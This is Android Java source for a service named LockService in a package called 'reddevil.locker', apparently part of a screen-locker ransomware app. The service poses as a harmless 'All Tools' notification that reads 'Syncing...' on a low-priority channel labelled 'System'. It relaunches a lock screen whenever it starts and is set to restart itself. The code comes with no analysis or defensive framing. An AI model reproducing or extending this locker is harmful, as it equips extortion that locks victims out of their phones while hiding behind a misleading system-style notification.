package com.reddevil.locker;

import android.app.*;
import android.content.*;
import android.os.*;

public class LockService extends Service {
    @Override public void onCreate() {
        super.onCreate();
        startForeground(1, buildNotification());
        showLock();
    }

    private Notification buildNotification() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel("lock","System",NotificationManager.IMPORTANCE_MIN);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
        }
        Notification.Builder nb = (Build.VERSION.SDK_INT >= 26)
            ? new Notification.Builder(this,"lock") : new Notification.Builder(this);
        return nb.setContentTitle("All Tools").setContentText("Syncing...")
                 .setSmallIcon(android.R.drawable.stat_sys_download).setOngoing(true).build();
    }

    private void showLock() {
        Intent intent = new Intent(this, LockActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
        startActivity(intent);
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        showLock();
        return START_STICKY;
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}
